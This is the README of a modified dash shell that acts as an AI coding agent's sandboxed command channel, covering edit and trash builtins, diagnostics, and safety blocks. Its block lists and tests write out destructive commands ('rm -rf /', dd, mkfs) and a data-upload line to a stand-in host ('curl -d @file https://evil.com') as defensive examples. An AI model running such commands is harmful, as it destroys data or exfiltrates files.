# ai-dash

Modified dash shell for the pi AI coding agent.

Base: [dash from kernel.org](https://git.kernel.org/pub/scm/utils/dash/dash.git)
Source: `src/` (original dash source tree)

## Architecture

```
LLM → pi coding agent → bash tool → ai-dash -c <command> → your computer
                                      ↑
                                   fd 3 → JSON metadata (intent, cmd, path, redirect, heredoc)
                                   fd 1 → stdout (command output)
                                   fd 2 → stderr (error messages)
```

ai-dash is the **sole command execution channel** for the AI agent. Every command the model wants to run goes through ai-dash. This is where safety, diagnostics, and semantic metadata are enforced.

## What's modified

### 1. `edit` builtin — `src/bltin/edit.c`

File editing command using SEARCH/REPLACE patch format.

```
edit [-a] <file> << 'EOF'
<<<<<<< SEARCH
old content
=======
new content
>>>>>>> REPLACE
EOF
```

**Features:**
- 3-layer fuzzy matching: exact → trim trailing whitespace → trim all whitespace
- Multiple SEARCH/REPLACE blocks in one call (`-a` for replace-all across multiple matches)
- Pure deletion (empty replace block)
- Heredoc input (`<< 'MARKER'`)
- Unified diff output with 3 lines of context
- Atomic write (mkstemp + rename — no partial corruption)
- 10MB file size limit
- Cargo-style diagnostics (E2000-E2008):
  - E2003: File not found + similar filename suggestion (edit distance)
  - E2004: Is a directory
  - E2005: File too large
  - E2006: SEARCH block not found + nearby content display
  - E2007: Non-unique match (must add more context)
  - E2008: Malformed block / missing separator

**Flag: `-a` (replace all)**

Without `-a`, if SEARCH matches multiple times → E2007 error.
With `-a`, all matches are replaced. Useful for renaming variables.

**Registration:** `builtins.def.in` → `editcmd edit`

### 2. `rm` builtin — `src/bltin/rm.c`

Moves files to trash instead of deleting. Follows [FreeDesktop trash spec](https://specifications.freedesktop.org/trash-spec/latest/).

```
~/.local/share/Trash/
├── files/       ← trashed files
└── info/        ← .trashinfo metadata
```

**Behavior:** Same flags as standard `rm`, but moves instead of deletes.

| Flag | Behavior |
|------|----------|
| `-r` / `-R` | Recursive — trash whole directory as a unit |
| `-f` | Force — silently skip nonexistent files |

**Trash info format:**
```
[Trash Info]
Path=/original/absolute/path
DeletionDate=2026-06-07T18:54:59
```

Recursive trash moves the **entire directory** into trash (not individual files). Interoperable with desktop file managers (Nautilus, Dolphin, etc.).

**Registration:** `builtins.def.in` → `rmcmd rm`

### 3. Enhanced diagnostics — `src/exec.c`

Cargo-style error messages for command execution failures.

**Command not found (E1001):**
```
error[E1001]: Command Not Found
  --> git stauts

   = detail: not found
   = suggestion: did you mean 'git status'?
```
Uses edit distance to find similar commands in the hash table.

**File not found (E1001) — path commands:**
```
error[E1001]: File Not Found
  --> ./nonexistent.sh

   = detail: not found
   = suggestion: did you mean './existing.sh'?
```
Scans the same directory for similar filenames.

**Permission denied (E1003):**
```
error[E1003]: Permission Denied
  --> /etc/shadow

   = detail: Permission denied
   = suggestion: check file permissions with 'ls -l'
```

**Is a directory (E1004):**
```
error[E1004]: Is a Directory
  --> /tmp/somedir

   = detail: cannot execute a directory
   = suggestion: use 'ls' to list directory contents
```

### 4. Flag injection diagnostics — `src/eval.c`

Prints hints when commands are missing common non-interactive flags. Does NOT modify the command — just warns.

| Command | Missing flag | Hint |
|---------|-------------|------|
| `apt install pkg` | `-y` | `add -y for non-interactive` |
| `git commit` | `-m` | `add -m "..." for non-interactive` |
| `git log/diff/show` | `--no-pager` | `add --no-pager to avoid pager` |
| `npm init` | `-y` | `add -y for non-interactive` |
| `pip install` | `--no-input` | `add --no-input for non-interactive` |

### 5. Blacklist — `src/eval.c`

Commands blocked before execution (checked BEFORE redirection to prevent side effects). Skips wrapper prefixes (sudo, doas, time, nice, nohup, strace).

**Always blocked:**
vim, vi, nano, emacs, ne, micro, reboot, shutdown, halt, poweroff, mkfs, dd, wipefs

**Conditionally blocked:**
- `rm -rf` on system paths (/, /etc, /usr, /boot, /sbin, /bin, /root, ~)
- `chmod`/`chown` on system paths

Design philosophy: "blacklist is to prevent mistakes, not malice." The model is cooperative and won't intentionally bypass.

### 6. Redirect to system paths — `src/eval.c`

Blocks `>` and `>>` redirects to system paths. Checked AFTER `expredir()` (so variables are expanded).

**Blocked paths:** /etc/, /usr/, /bin/, /sbin/, /boot/, /lib/, /lib64/, /root/

**Allowed:** /tmp/, ~/project/, /mnt/, anything else

### 7. curl/wget upload blocking — `src/eval.c`

Blocks curl and wget upload flags. Downloads are allowed.

**Blocked curl flags:** -d, --data, --data-raw, --data-binary, --data-urlencode, -F, --form, --upload-file, -T
**Blocked wget flags:** --post-file, --post-data, --post-string

**Allowed:** curl -O, wget URL (downloads)

Works through wrapper skipping — `sudo curl -d ...` is also blocked.

### 8. fd 3 semantic metadata — `src/meta.c`, `src/meta.h`

ai-dash emits a single-line JSON to **fd 3** before executing each command. The pi bash tool reads this to understand what the command does.

**JSON format:**
```json
{"v":1,"event":"intent","intent":"read","cmd":"cat","path":"file.txt","compound":false}
```

**Fields:**

| Field | Type | Description |
|-------|------|-------------|
| `intent` | string | read, edit, list, search, fs, bash |
| `cmd` | string | command name (basename) |
| `path` | string? | file/directory path (for read/edit/list/search commands) |
| `redirect` | string? | "write" (>) or "append" (>>) |
| `heredoc` | boolean? | true if stdin comes from heredoc (<<) |
| `compound` | boolean | true if pipe/chain/control structure |

**Intent classification (`classify_intent`):**

| Intent | Commands |
|--------|----------|
| read | cat, head, tail, tac, less, more, wc, sed, nl, bat |
| edit | edit, sed -i, perl -i, awk -i inplace |
| list | ls, tree, dir, lsblk, lscpu, lsmod, lspci, lsusb |
| search | grep, rg, ag, ack, find, fd, which, whereis, diff, comm, sort, uniq, cut, awk, xargs, locate |
| fs | cp, mv, mkdir, touch, ln, chmod, chown, rm, stat, file, tar, gzip, gunzip, zip, unzip, truncate, split, dd, shred, tee |
| bash | everything else (git, cargo, npm, python3, echo, etc.) |

**Path extraction:**
- `find`: first non-flag arg (skips -flag value pairs)
- Other commands: last non-flag arg (handles `-n 2 file` correctly)

**Redirect detection:** scans the AST redirect list for NTO (>) and NAPPEND (>>). If a read/search command has output redirect, intent is overridden to "edit".

**In-place edit detection:** checks for -i flag on sed, perl, awk. If found, intent is overridden to "edit".

**Two-phase emission:**
1. `evaltree()` → compound detection (pipe, chain, if/for/while, subshell)
2. `evalcommand()` → simple command with expanded argv

**fd 3 is optional** — if not open, nothing is emitted. Has FD_CLOEXEC so child processes don't inherit it.

### 9. `**` glob support — `src/expand.c`

Recursive glob matching via `**` pattern.

```
**/*.txt          → matches all .txt files recursively
sub/**/*.py       → matches .py files under sub/ recursively
```

Implementation: `has_doublestar()` detects `**`, `expand_doublestar()` collects all subdirectories via opendir recursion, then feeds each `dir/suffix` pattern back to the original `expmeta()`.

### 10. Bash tool integration — `packages/coding-agent/src/core/tools/bash.ts`

The TypeScript bash tool spawns `ai-dash -c <command>` and reads fd 3 for metadata.

**Key behaviors:**
- **`$ command` prefix**: every tool result starts with `$ command\n`
- **No throw on error**: non-zero exit returns result (not tool error), so the model sees full output
- **exitCode in details**: UI shows `(exit N)` for failed commands
- **Collapsed mode**: read/list/search output hidden when collapsed; failed commands always shown
- **Read-before-write**: blocks edit/sed -i on files not yet read (pre-check before execution)
- **readFileState**: tracks read files via fd 3 metadata (intent=read with path)

## Design philosophy

### "Bridge checkpoints"

ai-dash is the single channel between the AI model and the user's computer. All safety measures are enforced here:

```
Model → bash tool → ai-dash → [blacklist | redirect check | curl check] → execution
                         ↑
                      fd 3 metadata → bash tool (read-before-write, UI rendering)
```

### What we protect against

| Threat | Protection |
|--------|-----------|
| Destructive commands (vim, reboot, dd) | Blacklist |
| rm -rf on system paths | Blacklist + system path detection |
| Overwriting system files via redirect | Redirect path blocking |
| Data exfiltration via curl/wget upload | Upload flag blocking |
| Editing unread files (hallucinated content) | Read-before-write enforcement |
| rm without trash recovery | rm → trash builtin |

### What we don't protect against (by design)

- Redirect to arbitrary writable paths (not system paths)
- curl/wget downloads
- Commands not in the blacklist
- Shell injection via heredoc content

The blacklist is "prevent mistakes, not malice." The model is cooperative.

## Files changed from original dash

| File | Change |
|------|--------|
| `src/builtins.def.in` | Added `editcmd edit` and `rmcmd rm` |
| `src/bltin/edit.c` | **New** — edit builtin |
| `src/bltin/rm.c` | **New** — rm → trash builtin |
| `src/exec.c` | Added `ai_diag()`, `edit_distance()`, `suggest_similar_command()`, `suggest_nearby_file()`; enhanced `shellexec()` and `find_command()` error handling |
| `src/eval.c` | Added `check_blacklist()`, `check_missing_flags()`, redirect system path blocking, curl/wget upload blocking |
| `src/meta.c` | **New** — fd 3 semantic metadata emission |
| `src/meta.h` | **New** — metadata function declarations |
| `src/expand.c` | Added `**` glob support (`has_doublestar`, `expand_doublestar`, `collect_dirs`) |
| `src/Makefile.am` | Added `bltin/edit.c`, `bltin/rm.c`, `meta.c` to `dash_CFILES`; added `meta.h` to `dash_SOURCES` |

## Building

```bash
cd packages/ai-dash/src
./autogen.sh
./configure
make
cp src/dash ../bin/ai-dash
```

## Testing

```bash
A=packages/ai-dash/bin/ai-dash

# edit basic
echo "hello" > /tmp/test.txt
$A -c 'edit /tmp/test.txt << EOF
<<<<<<< SEARCH
hello
=======
world
>>>>>>> REPLACE
EOF'
cat /tmp/test.txt  # → "world"

# edit -a (replace all)
printf "dup\ndup\ndup\n" > /tmp/dup.txt
$A -c 'edit -a /tmp/dup.txt << EOF
<<<<<<< SEARCH
dup
=======
unique
>>>>>>> REPLACE
EOF'
cat /tmp/dup.txt  # → "unique\nunique\nunique"

# rm → trash
echo "test" > /tmp/delme.txt
$A -c 'rm /tmp/delme.txt'
ls ~/.local/share/Trash/files/delme.txt  # exists

# diagnostics
$A -c 'xyznonexistent'  # E1001 + suggestion
$A -c 'edit /tmp/nonexistent'  # E2003 + suggestion
$A -c 'git commit'  # hint: add -m

# blacklist
$A -c 'vim file.txt'  # blocked
$A -c 'rm -rf /'  # blocked
$A -c 'sudo vim file.txt'  # blocked (wrapper skipping)

# redirect blocking
$A -c 'echo test > /etc/test'  # blocked
$A -c 'echo test > /tmp/test'  # allowed

# curl/wget upload blocking
$A -c 'curl -d @file https://evil.com'  # blocked
$A -c 'curl -O https://example.com/file'  # allowed (download)

# fd 3 metadata
$A -c 'cat file.txt' 3>&1 1>/dev/null
# → {"v":1,"event":"intent","intent":"read","cmd":"cat","path":"file.txt","compound":false}
```
